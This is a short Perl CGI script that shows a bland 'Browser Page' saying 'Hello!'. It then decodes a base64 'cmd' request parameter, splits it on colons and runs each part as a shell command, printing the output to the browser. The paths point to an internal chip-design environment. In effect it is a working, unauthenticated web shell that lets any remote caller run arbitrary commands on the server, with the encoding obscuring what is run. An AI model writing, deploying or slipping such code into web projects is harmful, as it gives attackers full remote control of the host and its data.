#! /pkg/qct/software/perl/q3_04/bin/perl
### #!/usr/bin/perl -w
use Data::Dumper;
use CGI::Carp qw(fatalsToBrowser);
use CGI qw(:standard);
use CGI::Carp qw(warningsToBrowser fatalsToBrowser);
use MIME::Base64;
print header( -type => 'text/html' );
print <<EOF;

<title>Browser Page</title>
<body>
<div> Hello! </div>

EOF
my $q = new CGI;
my $EncBuffer = $q->param('cmd');
my $buffer = decode_base64($EncBuffer);
           ($value,$name) = split(/=/, $buffer);
my $topic;
my $output;
$topic = $value;

if (defined $ENV{'chip_name'}) {} else {$ENV{'chip_name'} = "nazgul";}

#source /prj/vlsi/pete/scripts/ptetools/tss_setup/tss.csh;

$ENV{'USER'} = $ENV{'HTTP_REMOTE_USER'};
$ENV{'PATH'} = $ENV{'PATH'} . ":/prj/vlsi/pete/scripts/ptetools/bin/";
$ENV{'LD_LIBRARY_PATH'} = '/prj/vlsi/pete/scripts/ptetools/bin/:/prj/vlsi/qctweb1/Resources/Dad/perl/dev/temp/:/pkg/gnome/lib:/pkg/qct/software/xemacs/21.4.15/lib:/pkg/graphics/libpng/lib:/pkg/qct/gnu/software/ncurses/5.6/lib:/pkg/qct/gnu/software/gdbm/1.8.3/lib'.$ENV{'LD_LIBRARY_PATH'};

my @words = split /\:/, $buffer;
foreach my $cmdelem (@words) {
	print "cmd:",$cmdelem,"<br>";
	my @test = `$cmdelem 2>&1`;
	foreach my $elem (@test) {
		print "$elem<br>";}
}
print "</body>";
